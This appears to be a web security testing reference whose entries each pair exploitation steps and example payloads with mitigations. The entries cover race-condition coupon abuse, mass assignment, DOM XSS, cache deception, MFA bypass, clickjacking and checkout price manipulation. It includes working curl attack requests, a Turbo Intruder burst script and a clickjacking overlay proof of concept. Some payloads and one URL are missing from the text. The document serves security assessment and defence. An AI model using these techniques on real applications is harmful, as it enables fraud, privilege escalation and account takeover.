exploitationSteps: To exploit a Limit Overrun (e.g., single-use coupon): Capture the legitimate request for applying the coupon code.

Configure Turbo Intruder with a custom Python script designed to queue all requests and release them in a single, synchronized connection burst (leveraging HTTP/2 single-packet techniques if supported, minimizing network jitter).
Execute the attack, sending 30 simultaneous requests to apply the identical coupon code.

Review the resulting HTTP responses. If multiple requests return a successful application status (e.g., `200 OK - Discount Applied`), and the final cart total reflects multiple identical discounts, the race condition is successfully exploited.

Thoroughly document the exact timing parameters, the lack of locking mechanisms, and the resulting financial or logical impact. Stop testing immediately after verifying the flaw to prevent irreversible data corruption.

examplePayloads.label: Identifying Race Conditions via concurrent curl execution (Rudimentary test)
examplePayloads.command: seq 1 20 | xargs -n1 -P20 -I{} curl -s -X POST -H "Cookie: session=VALID" -d "coupon=FREE100" https://<target-url>/apply_coupon

examplePayloads.label: Turbo Intruder script for synchronized request bursting (Advanced exploitation)
examplePayloads.command:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # Queue 20 requests
    for i in range(20):
        engine.queue(target.req)
    # Release all requests simultaneously
    engine.start(timeout=5)

def handleResponse(req, interesting):
    table.add(req)

variants: Limit Overrun (TOCTOU): Bypassing quantity restrictions, financial limits, or usage caps by executing identical actions concurrently.

State Machine Manipulation: Sending concurrent requests to different endpoints within a workflow (e.g., hitting the 'checkout' and 'add to cart' endpoints simultaneously) to force the backend into an invalid logical state.
Rate Limit Evasion: Sending parallel brute-force requests faster than the rate-limiting middleware can update its internal counters, circumventing lockout mechanisms.
mitigation: Implement rigorous pessimistic locking at the database layer (e.g., utilizing `SELECT ... FOR UPDATE` in SQL). This guarantees that when a thread reads a critical record, the record is firmly locked, forcing all subsequent concurrent threads attempting to read or modify that same record to wait until the initial transaction fully commits.

Alternatively, implement robust optimistic concurrency control utilizing version columns or timestamps. The application verifies that the record's version has not changed between the time it was initially read and the time the update is attempted; if a conflict is detected, the transaction is safely aborted and rolled back.

Utilize atomic database operations inherently immune to race conditions (e.g., `UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance >= 100`) rather than executing separate read-then-write application-layer logic.

Implement strict rate limiting and request serialization mechanisms utilizing high-performance in-memory datastores (like Redis Distributed Locks) to serialize critical workflow operations at the application gateway layer.

WEB-111.prerequisites: Access to a web application built on modern frameworks (such as Spring Boot, Ruby on Rails, ASP.NET MVC, or Express.js) that heavily utilize Object-Relational Mapping (ORM) and automatic data-binding features. An intercepting proxy like Burp Suite to inject unprompted JSON keys or HTTP parameters.
WEB-111.whatItIs: An endpoint that creates or updates a record takes the entire incoming request and automatically applies every field in it to the underlying data — without an explicit list of which fields are actually allowed to be set. That means an attacker can sneak in a field like 'is_admin' or 'account_balance' that was never meant to be user-editable, and have it silently accepted.
WEB-111.rootCause: This happens because many frameworks make it very convenient to map an entire request straight onto a data object automatically, to save typing. Without an explicit list restricting which fields are actually allowed, every single field that exists on that data record — not just the intended ones — becomes settable by anyone who includes it in their request.
WEB-111.impact: Exploitation frequently leads directly to Vertical Privilege Escalation, allowing a standard user to elevate their account to administrative status by injecting `"role":"admin"`. It can also result in critical logic bypasses, such as modifying financial balances, altering product prices during checkout, or modifying ownership IDs to seize control of other users' data.
stepsToIdentify: Meticulously analyze application workflows that create or update records (e.g., account registration, profile updates, checkout processes).
Capture the standard HTTP request and identify the data structure (e.g., a JSON payload containing `{"username":"test", "email":"test@test.com"}`).

Fuzz the endpoint by injecting educated guesses for sensitive administrative or internal fields into the payload (e.g., appending `"is_admin":true`, `"role_id":1`, `"status":"approved"`, or `"balance":9999`).

Examine the application's subsequent state. If the user account is suddenly granted administrative capabilities, or if a separate `GET /profile` request reflects the maliciously injected attribute, Mass Assignment is confirmed.
exploitationSteps: To exploit Privilege Escalation during registration: Capture the `POST /api/users/register` request.
Append `"role":"admin"` or `"privileges":["superuser"]` to the JSON payload. Submit the modified request.
Log into the application using the newly created credentials and attempt to access a strictly administrative endpoint (e.g., `/api/admin/users`) to verify the privilege escalation.

To exploit business logic (e.g., skipping payment): During a checkout process, append `"payment_status":"completed"` to the cart update payload, potentially bypassing the actual payment gateway validation.
Document the exact injected parameters and the resulting state manipulation, emphasizing the lack of strict DTO mapping.

examplePayloads.label: Identifying Mass Assignment during a standard user profile update
examplePayloads.command: curl -X PUT -H "Content-Type: application/json" -H "Authorization: Bearer USER_TOKEN" -d '{"email":"attacker@example.com", "role":"admin", "isAdmin":true}' https://<target-url>/api/profile

examplePayloads.label: Exploiting Auto-Binding to bypass payment logic in a vulnerable checkout flow
examplePayloads.command: curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer USER_TOKEN" -d '{"item_id": 44, "quantity": 1, "status": "PAID"}' https://<target-url>/api/cart/checkout

variants: Vertical Privilege Escalation: Overriding role-based parameters (`is_admin`, `role_id`) to gain administrative rights.
Business Logic Bypass: Overriding internal state flags (`is_verified`, `payment_status`, `discount_applied`) to circumvent required workflows.
Object Overwriting (IDOR via Mass Assignment): Overriding the `user_id` or `organization_id` property during an update operation to forcefully reassign ownership of a record to a different entity.
mitigation: Architecturally abandon the practice of binding HTTP requests directly to internal Database Models or ORM entities. Strictly implement Data Transfer Objects (DTOs) that contain only the specific fields the client is explicitly permitted to modify.

Implement rigorous, framework-level allowlists. In Ruby on Rails, aggressively utilize `Strong Parameters`; in Spring, carefully configure `@InitBinder` with `setAllowedFields()`; in Node.js, selectively extract only permitted keys from `req.body`.

If legacy code prevents immediate DTO implementation, implement strict denylists at the ORM layer, categorically blacklisting sensitive fields (like `role`, `id`, `password_hash`) from ever being dynamically assigned.

Apply the Principle of Least Privilege at the database layer. Even if the application attempts to auto-bind a `role` update, the database user executing the query should lack the permissions to modify that specific column for standard user accounts.

WEB-112.prerequisites: A web application that heavily relies on client-side JavaScript to dynamically manipulate the Document Object Model (DOM) based on user-controllable inputs (Sources) and passes that data to unsafe execution functions (Sinks). A modern web browser with Developer Tools is required for tracing execution flows.
WEB-112.whatItIs: This kind of script-injection attack happens entirely inside the browser, with the server never even seeing what's going on. The app's own JavaScript reads something from the page's own address (like the part after a #) and inserts it directly into the page without cleaning it up — letting an attacker craft a link that runs their own code the moment it's clicked.
WEB-112.rootCause: Client-side code pulls in untrusted data straight from the browser's own environment and inserts it into the page without properly encoding it for that specific spot, or without using a safer method to insert content. Because this data often lives in the part of the URL that never gets sent to the server, it also completely bypasses any server-side filtering or firewall.
WEB-112.impact: The impact is identical to Stored or Reflected XSS—execution of arbitrary JavaScript in the victim's browser context. This allows attackers to silently steal session cookies, hijack LocalStorage tokens, execute highly convincing phishing overlays, and perform arbitrary state-changing actions (CSRF) via asynchronous requests using the victim's authenticated session.
stepsToIdentify: Meticulously analyze the client-side JavaScript utilizing browser Developer Tools, focusing on the identification of 'Sources' (e.g., `location.hash`, `location.search`, `document.cookie`).
Trace the execution flow of the data extracted from these Sources to determine if it reaches a dangerous 'Sink' (e.g., `innerHTML`, `document.write()`, `setTimeout()`, `eval()`).
Inject a highly recognizable, benign canary string (e.g., `DOM_XSS_TEST`) into a suspected Source (e.g., `https://target.com/page#DOM_XSS_TEST`).
Inspect the rendered DOM in the browser's elements pane. If the canary string appears unsanitized within an HTML tag or script block, construct a breakout payload specific to that DOM context.
Utilize browser debugging tools (setting breakpoints on the vulnerable sink) to observe the payload exactly as it is processed by the JavaScript engine.
exploitationSteps: Craft a targeted payload designed to execute within the specific identified Sink. For an `innerHTML` sink, an `` tag with an `onerror` handler is highly effective.
Construct the final attack URL containing the payload exclusively within the URI fragment, ensuring the backend server never sees the malicious code (e.g., `https:///dashboard#`).
Deliver the URL to a victim. When the victim's browser loads the page, the vulnerable client-side JavaScript extracts the payload from the fragment and passes it to the Sink, triggering execution.
Document the exact JavaScript file, the specific line of vulnerable code, the Source, the Sink, and the payload utilized.

examplePayloads.label: DOM XSS payload targeting an innerHTML sink via the URL hash fragment
DOM XSS payload targeting a JavaScript eval() sink via URL parameters
Bypassing naive client-side regex filters utilizing SVG onload

variants: Reflected DOM XSS: The server reflects a payload into a JavaScript variable, which is then immediately passed to a dangerous Sink by the client-side code.
Stored DOM XSS: The payload is retrieved from a persistent backend database via an API call (e.g., a JSON response), and the client-side JavaScript insecurely renders that JSON data into the DOM.
Third-Party DOM XSS: The vulnerability exists within a widely utilized third-party JavaScript library or analytics tracking code embedded on the target application.
mitigation: Architecturally enforce the use of inherently safe DOM manipulation APIs. Strictly mandate the use of `element.textContent` or `element.innerText` instead of `element.innerHTML` when dynamically displaying untrusted data.
If HTML must be dynamically rendered, implement robust, client-side HTML sanitization utilizing proven libraries (e.g., DOMPurify) directly before passing data to the execution sink.

Categorically prohibit the use of hazardous JavaScript execution sinks such as `eval()`, `setTimeout(string)`, and `setInterval(string)`. Refactor code to utilize safe closures and functional programming paradigms.

Deploy a strict Content Security Policy (CSP) that categorically disables inline scripts (`unsafe-inline`) and forbids the use of `eval()` (`unsafe-eval`), acting as a robust defense-in-depth mechanism against successful payload execution.

WEB-113.prerequisites: A web application deployed behind a heavily utilized caching layer (e.g., Cloudflare, Akamai, Varnish) configured to aggressively cache static assets based solely on URL file extensions (e.g., caching anything ending in `.jpg`, `.css`, or `.js`). The application framework must tolerate path information appended to valid URLs (often referred to as 'path matrix' or 'path info' tolerance).
WEB-113.whatItIs: This is a sneaky variant where an attacker tricks a victim into accidentally caching their own private data — instead of poisoning the cache for everyone, they get the victim's own sensitive page saved into a shared cache, then simply retrieve it themselves afterward. This often works by adding a fake file extension like '.jpg' to the end of a private page's address, tricking the cache into treating it like a plain, public image.
WEB-113.rootCause: There's a mismatch between how the caching system decides what to cache (often based on simple rules like 'anything ending in .jpg') and how the actual app handles unusual URLs (often ignoring extra text tacked onto the end and just processing the normal page underneath). That gap lets an attacker disguise a private page as a cacheable public file.
WEB-113.impact: Exploitation leads directly to catastrophic Information Disclosure and Session Hijacking. By forcing the caching layer to store a victim's authenticated profile page, API keys, CSRF tokens, or financial statements, the attacker can retrieve these highly sensitive artifacts entirely unauthenticated, bypassing all application-level access controls.
stepsToIdentify: Identify dynamic endpoints that return highly sensitive, authenticated data (e.g., `https://target.com/account/settings`).
Append a static file extension to the endpoint (e.g., `https://target.com/account/settings/test.css`).

Meticulously analyze the HTTP response. If the backend application ignores the `.css` extension and successfully returns the sensitive account settings page, the application framework possesses the requisite 'path tolerance'.

Analyze the response headers (e.g., `X-Cache`, `CF-Cache-Status`). If the header indicates a `MISS` on the first request and a `HIT` on the subsequent request, the caching layer has been successfully deceived into caching the sensitive dynamic response.
exploitationSteps: Craft the deceptive URL targeting a highly sensitive endpoint, appending a cacheable extension (e.g., `https://<target-url>/api/user_tokens/dummy.js`).
Deliver this specific URL to an authenticated victim via social engineering, spear-phishing, or embedding it as an invisible `` or `

When the victim's browser requests the URL, their session cookies are included. The backend application generates their sensitive data, but the caching layer, seeing the `.js` extension, intercepts the outgoing response and stores it in the public cache.
Immediately query the exact same URL unauthenticated. The caching layer will serve a `HIT`, delivering the victim's heavily authenticated data directly to the attacker.
Document the successful extraction of sensitive data and immediately invalidate any disclosed tokens.

examplePayloads.label: Identifying Path Tolerance on the backend web framework
examplePayloads.command:
curl -H "Cookie: session=VALID" -i https://<target-url>/profile/nonexistent.jpg
# Verify if the application returns the 200 OK profile instead of a 404.

examplePayloads.label: Confirming Web Cache Deception via caching headers
examplePayloads.command:
curl -H "Cookie: session=VALID" -i https://<target-url>/profile/nonexistent.jpg
# Repeat the request to observe 'X-Cache: HIT' on a dynamically generated page.

variants: Path Info Deception: Appending the extension as a distinct path segment (e.g., `/profile/image.jpg`).
Delimiter Deception: Utilizing framework-specific delimiters (like semicolons in Spring) to confuse the cache (e.g., `/profile;image.jpg`).
Query String Deception: If the cache ignores query strings but caches based on the core path, modifying the request to force a static evaluation.
mitigation: Ensure absolute alignment between caching configurations and backend routing logic. Caching layers should be configured to cache based on explicit `Content-Type` headers provided by the backend (e.g., only cache if the response is actually `image/jpeg`), rather than relying on easily spoofed URL extensions.

Configure the backend web application framework to strictly enforce strict routing. The framework must return a definitive `404 Not Found` for any URL that contains unexpected, trailing path segments or extensions, permanently neutralizing path tolerance.

Implement mandatory `Cache-Control: no-store, no-cache, private, must-revalidate` HTTP headers on all dynamic, authenticated endpoints. Properly configured CDNs will respect these directives and aggressively refuse to cache the content, regardless of the URL structure.

WEB-114.prerequisites: Access to a web application utilizing Multi-Factor Authentication (MFA, 2FA, or OTP) for user login, password resets, or high-value transactions. An intercepting proxy like Burp Suite Professional to analyze state transitions, manipulate HTTP response codes, and execute high-speed brute-force attacks via Burp Intruder.
WEB-114.whatItIs: This covers several different ways an attacker can skip the second login step (2FA) entirely, without ever stealing the actual code. Common examples: no limit on how many codes someone can guess, the app granting full access right after the password check and only relying on the screen to still show a 2FA prompt afterward, or trusting a value the client can just edit directly (like flipping a 'success: false' response to 'success: true').
WEB-114.rootCause: This usually comes down to how the login process is actually built on the server: no rate limit on code attempts, a flawed sequence where full access gets granted before 2FA is genuinely verified, predictable codes, or trusting something the client sends instead of independently confirming on the server that 2FA actually succeeded.
WEB-114.impact: Exploitation utterly neutralizes the security benefits of MFA, leading directly to Account Takeover if the attacker has acquired the victim's primary credentials (via credential stuffing, phishing, or prior breaches). It grants the attacker unfettered access to sensitive data and administrative privileges, exactly as if MFA had never been implemented.
stepsToIdentify: Authenticate using valid primary credentials and carefully intercept the HTTP response transitioning to the MFA prompt. Analyze the response to determine if a fully privileged session cookie (e.g., `JSESSIONID`) is issued prematurely before the MFA code is supplied.

Attempt a direct forced browsing bypass: manually alter the URL in the browser from `/mfa_verify` to `/dashboard` or `/account_settings`. If the application grants access, the state machine is catastrophically broken.

Deliberately enter an incorrect MFA code (e.g., `000000`) and intercept the server's rejection response. Modify the HTTP status code (e.g., changing `401 Unauthorized` to `200 OK`) and alter JSON boolean flags to simulate a successful validation.

Test for rate-limiting failures by sending 100 rapid, consecutive requests with incorrect MFA codes. Observe if the server enforces a lockout, applies a time delay, or continues processing requests unhindered.
exploitationSteps: To exploit a Rate-Limiting failure (OTP Brute Force): Intercept the MFA submission request. Send it to Burp Intruder. Configure a sniper attack payload utilizing a numerical list (e.g., `0000` to `9999` for a 4-digit PIN). Execute the attack aggressively and monitor the HTTP response lengths or status codes to identify the single successful PIN, bypassing the control.

To exploit State Machine Flaws: Intercept the initial login response. If a valid token is issued, immediately drop the subsequent request to load the `/mfa_verify` page, manually navigate to `/admin_dashboard` using the prematurely issued token, and document the unauthorized access.

To exploit Parameter Manipulation: During MFA setup or verification, look for parameters like `mfa_enabled=true` or `user_id=123`. Manipulate these parameters to forcefully disable MFA on the target account or associate the victim's account with an attacker-controlled MFA device (Rogue Device Registration).
Document the specific bypass methodology meticulously, proving that secondary verification is not robustly enforced on the backend.

examplePayloads.label: Forced Browsing to bypass MFA prompt (Direct URL Navigation)
examplePayloads.command:
curl -i -H "Cookie: session=PREMATURELY_ISSUED_TOKEN" https://<target-url>/api/sensitive_dashboard
# If 200 OK is returned, the state machine is flawed.

examplePayloads.label: Automated OTP Brute Force targeting a 4-digit PIN via ffuf (Lack of Rate Limiting)

variants: OTP Brute Forcing: Exploiting the lack of rate limiting to systematically guess short numeric codes.
State Machine / Forced Browsing Bypass: Bypassing the MFA UI to access authenticated endpoints utilizing a prematurely issued session token.
Response Manipulation: Tricking the client-side logic into proceeding by altering the backend server's rejection response.
Rogue Device Registration: Exploiting authorization flaws in the MFA setup workflow to bind an attacker's authenticator app to the victim's profile.
mitigation: Architecturally enforce a strict, un-bypassable Authentication State Machine on the backend server. The application must never issue a fully privileged session token until *both* the primary password and the secondary MFA token have been successfully validated. Utilize temporary, highly restricted 'pre-auth' tokens during the intermediate MFA step.

Implement aggressive, unforgiving rate limiting and account lockout mechanisms specifically targeting the MFA validation endpoints. For instance, restrict validation attempts to a maximum of 5 per 15 minutes, permanently blocking brute-force attacks against short numeric OTPs.
Ensure backend authorization checks validate the user's specific MFA context for every sensitive request, completely ignoring client-side routing or locally manipulated JSON parameters.
Utilize cryptographically secure, high-entropy tokens for verification links (e.g., email magic links), ensuring they cannot be sequentially guessed or mathematically predicted.

WEB-116.prerequisites: A web application that contains state-changing or highly sensitive functionality (e.g., transferring funds, deleting an account, granting permissions) and lacks proper anti-framing HTTP response headers. The attacker requires the ability to host a malicious HTML page to orchestrate the UI redressing.
WEB-116.whatItIs: Clickjacking tricks a user into clicking something on a completely different, sensitive page than the one they think they're looking at — by layering an invisible or disguised version of that sensitive page underneath what they actually see, using an embedded frame. The click lands on the real, sensitive button underneath, triggering an action the user never actually meant to take.
WEB-116.rootCause: The app never tells the browser whether it's allowed to be embedded inside another website's page at all. Without a specific setting blocking this, browsers allow any website to embed the page inside a frame by default — which is exactly what this attack depends on.
WEB-116.impact: Exploiting Clickjacking allows an attacker to covertly force an authenticated victim to perform critical actions without their consent or knowledge. Impacts range from unauthorized financial transfers, silently elevating privileges (e.g., clicking 'Make Admin'), forcefully linking an attacker's OAuth account to the victim's profile, or tricking the user into authorizing access to their device's microphone or camera via a hidden settings panel.
stepsToIdentify: Select critical, state-changing endpoints within the target application (e.g., the 'Delete Account' confirmation page or a financial transfer screen).

Examine the HTTP response headers for these specific endpoints using Burp Suite or browser Developer Tools. Specifically look for the absence of `X-Frame-Options` (XFO) and `Content-Security-Policy` (CSP) containing the `frame-ancestors` directive.
Construct a rudimentary HTML page locally, containing a basic `<iframe>` targeting the sensitive endpoint (e.g., `<iframe src="https://target.com/settings/delete"></iframe>`).

Load the local HTML page in a modern browser. If the target application successfully renders within the iframe without returning an error or breaking out of the frame, the application is fundamentally vulnerable to framing.
Ensure the vulnerable page relies on simple, single-click actions that can be reliably positioned and executed.
exploitationSteps: Develop an advanced malicious HTML page tailored to the target application's specific UI layout.

Embed the target application within an iframe, but utilize CSS properties (`opacity: 0.0001`, `z-index: 2`, `position: absolute`) to render the iframe entirely transparent while maintaining its interactivity on top of the DOM.

Position an attractive, innocuous element (like a 'Win a Prize!' button) on the attacker's page exactly underneath the transparent, critical button inside the iframe (e.g., the 'Confirm Transfer' button).

Host the page and lure an authenticated victim to it. When the victim attempts to click the visible, fake button, their click is intercepted by the transparent iframe, executing the malicious action securely within their authenticated session.
Document the lack of framing protections and provide a functional HTML proof-of-concept demonstrating the exact CSS positioning required for the overlay.

examplePayloads.label: Basic HTML PoC to verify if an application permits cross-origin framing
Clickjacking Overlay PoC utilizing CSS transparency (UI Redressing)
examplePayloads.command:
<html>
<head>
<style>
  #target-frame { position:absolute; top:10px; left:10px; width:500px; height:500px; opacity:0.0001; z-index:2; }
  #decoy-btn { position:absolute; top:250px; left:100px; z-index:1; padding:20px; font-size:20px; }
</style>
</head>
<body>
  <button id="decoy-btn">Click here to win an iPad!</button>
  <iframe id="target-frame" src="https://<target-url>/settings/delete_account"></iframe>
</body>
</html>

variants: Standard Clickjacking: Utilizing transparent iframes to overlay a hidden, malicious action on top of a benign-looking button.
Likejacking/Sharejacking: Tricking users into inadvertently 'Liking' a Facebook page or sharing a malicious URL on social media to amplify a campaign.

Drag-and-Drop Hijacking: Tricking a user into dragging a benign-looking element (which actually contains sensitive text, like a password or token) and dropping it into an attacker-controlled text field.
mitigation: Deploy the modern `Content-Security-Policy` (CSP) HTTP response header, specifically utilizing the `frame-ancestors` directive to strictly govern which domains are authorized to frame the application. For example, `Content-Security-Policy: frame-ancestors 'self';` outright blocks all cross-origin framing.

For defense-in-depth and support for legacy browsers, deploy the `X-Frame-Options` (XFO) HTTP response header. Set the value to `DENY` to universally prevent framing, or `SAMEORIGIN` to allow framing only by pages on the exact same domain.

Architecturally enforce SameSite cookie attributes (`SameSite=Strict` or `Lax`). If the victim's session cookies are not transmitted during cross-origin framing scenarios, the clickjacking attempt will fail as it targets an unauthenticated state.

Implement 'Frame-busting' JavaScript scripts as a legacy fallback, though this should never be relied upon as a primary defense, as modern browsers provide mechanisms to easily circumvent JavaScript-based frame-busting.

WEB-117.prerequisites: Access to a web application featuring an e-commerce checkout, financial transaction workflow, or inventory management system. An intercepting proxy like Burp Suite is essential to carefully manipulate transactional parameters, API payloads, and sequential workflow steps before they reach the backend processing logic.
WEB-117.whatItIs: This covers cases where the app's shopping/checkout logic doesn't properly account for unexpected input or unusual sequences of actions — letting someone change an item's price, skip a minimum order requirement, or apply a discount that was never actually valid, just by exploiting a gap in how the checkout process is built.
WEB-117.rootCause: Important business rules — like calculating the total, applying discounts, checking stock — often only get enforced in the browser's own JavaScript, for a smoother user experience, without the server independently re-checking those same calculations before actually finalizing anything. Sometimes the checkout process can also just be jumped straight to the final step, skipping requirements along the way.
WEB-117.impact: Exploiting business logic flaws leads directly to substantial financial fraud, inventory theft, and reputational damage. An attacker can systematically purchase high-value physical goods for negligible amounts (e.g., $0.01), endlessly duplicate digital assets, deliberately exhaust competitor inventory by forcing negative stock values, or bypass licensing and subscription tiers to access premium services without compensation.
stepsToIdentify: Meticulously map the entire intended workflow of the target transaction (e.g., 1. Add to Cart -> 2. Apply Discount -> 3. Select Shipping -> 4. Confirm Payment).
Intercept the requests at each step using Burp Suite and scrutinize the parameters. Identify any fields representing price, quantity, discount rates, shipping costs, or product IDs.

Systematically inject edge-case values into these parameters: negative integers (e.g., `quantity=-10`), incredibly large integers (testing for integer overflow), floating-point anomalies (e.g., `price=0.000001`), or null values.

Attempt to forcefully reorder or skip procedural steps. For example, intercept the final confirmation request, drop the payment processing request entirely, and directly request the `/order_success` endpoint to observe if the backend state machine enforces sequential prerequisites.
exploitationSteps: To exploit Price Manipulation: During the 'Add to Cart' POST request, modify the hidden `price` parameter from `price=1000.00` to `price=1.00`. Proceed through the checkout. If the payment gateway processes a $1.00 charge and issues a valid receipt, the logic is broken.

To exploit Negative Quantity Manipulation: Add one high-value item (Item A, $1000) and one low-value item (Item B, $10) to the cart. Intercept the cart update request and change the quantity of Item A to `-1`. If the application fails to validate negative integers, the cart total may mathematically evaluate to a negative balance (`-$990`), potentially forcing the payment gateway to issue a massive refund to the attacker's card upon checkout.

To exploit Currency/Integer Overflow: Inject a maliciously large quantity (e.g., `quantity=2147483648`). If the backend utilizes a signed 32-bit integer for total cost calculation, the multiplication may wrap around to a negative value, bypassing payment constraints.
Document the specific manipulation vectors and the resulting financial discrepancy, ensuring no actual fraud is committed during the assessment.

examplePayloads.label: Price Manipulation via intercepting the Add to Cart payload
examplePayloads.command:
curl -X POST -H "Content-Type: application/json" -d '{"product_id": 99, "quantity": 1, "price_override": 0.01}' https://<target-url>/api/cart/add
# Assessor notes if the backend accepts the client-supplied price.

examplePayloads.label: Negative Quantity manipulation targeting total calculation logic
examplePayloads.command:
curl -X PUT -H "Content-Type: application/json" -d '{"item_id": 10, "quantity": -5}' https://<target-url>/api/cart/update
# Assessor verifies if the total cart value decreases.

variants: Parameter Tampering (Price/Quantity): Altering transaction values relying on weak client-side trust.
Workflow Bypass (Forced Browsing): Skipping crucial business logic steps (e.g., skipping the payment screen and directly requesting the digital download token).
Discount/Coupon Abuse: Applying mutually exclusive coupons simultaneously, reapplying single-use coupons across multiple concurrent sessions, or bypassing minimum purchase thresholds.
mitigation: Implement an absolute Zero-Trust architecture regarding client-supplied data in transactional workflows. The backend must NEVER trust prices, discount rates, or totals submitted by the client. The application must independently retrieve the authoritative price from the secure backend database based purely on the submitted Product ID.

Enforce rigorous, server-side data validation on all inputs. Quantities must be strictly validated as positive integers greater than zero. Establish explicit upper bounds to prevent integer overflow exploits during complex cart total calculations.

Architect and enforce a strict, cryptographically backed State Machine on the backend server. The application must explicitly verify that the user has successfully completed Step A and Step B before permitting them to execute Step C, categorically preventing workflow bypasses.

Implement holistic business logic monitoring. Define anomalous transactional patterns (e.g., negative cart totals, hundreds of identical coupon applications within seconds, orders totaling $0.01) and configure alerting or automated blocking at the transaction processing layer.

WEB-118.prerequisites: Reconnaissance tools capable of identifying active DNS records (specifically CNAME, A, or NS records) associated with the target organization. Access to popular third-party cloud service providers (e.g., AWS S3, GitHub Pages, Azure App Services, Heroku) to register and claim abandoned endpoints.
WEB-118.whatItIs: A DNS record points to an external service — like a cloud storage bucket or hosting platform — that's no longer actually being used by the organization. Since that service address is now unclaimed, an attacker can register it themselves and take full control over whatever gets shown on the organization's own subdomain.
